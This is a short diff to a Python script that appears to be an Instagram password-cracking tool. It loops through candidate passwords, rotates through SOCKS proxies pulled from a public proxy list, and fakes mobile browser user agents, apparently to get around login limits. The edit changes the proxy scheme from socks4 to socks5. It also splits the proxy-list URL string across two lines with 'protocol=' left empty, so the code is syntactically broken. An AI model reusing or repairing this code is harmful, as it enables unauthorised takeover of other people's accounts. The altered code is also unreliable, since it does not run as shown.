@@ -49,7 +49,8 @@ except:
     pass
     
 try:
-    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=1000000&country=all&ssl=all&anonymity=all').text
+    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=
+		       &timeout=1000000&country=all&ssl=all&anonymity=all').text
     open('.prox.txt','w').write(prox)
 except Exception as e:
     print('GAGAL')
@@ -428,7 +429,7 @@ class instagram:
             for pw in pas:
                 ts = calendar.timegm(current_GMT)
                 nip=random.choice(prox)
-                proxs= {'http': 'socks4://'+nip}
+                proxs= {'http': 'socks5://'+nip}
                 aa='Mozilla/5.0 (HuaweiBrowser/11.1.3.300 '
                 b=random.choice(['4','5','6','7','8','9','10','11','12'])
                 c='HarmonyOS; JKM-AL00b; HMSCore 6.4.0.311'
